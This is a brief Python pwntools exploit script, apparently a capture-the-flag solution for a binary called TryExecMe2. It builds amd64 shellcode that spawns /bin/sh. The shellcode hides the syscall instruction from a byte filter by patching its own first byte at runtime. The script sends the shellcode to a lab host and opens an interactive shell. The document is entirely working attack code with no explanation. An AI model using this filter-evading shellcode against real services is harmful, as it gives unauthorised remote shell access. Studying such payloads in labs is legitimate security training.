from pwn import *

context.arch = 'amd64'
context.binary = binary = ELF('./TryExecMe2', checksec=False)

shellcode = asm('''
	lea rdi, [rip+binsh]
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 59

	inc BYTE PTR [rip]
	.byte 0x0e
	.byte 0x05

	binsh:
	.string "/bin/sh"
	''')


#p = process()
p = remote('10.10.102.129', 5002)

p.sendline(shellcode)

p.recvrepeat(1)
p.interactive()

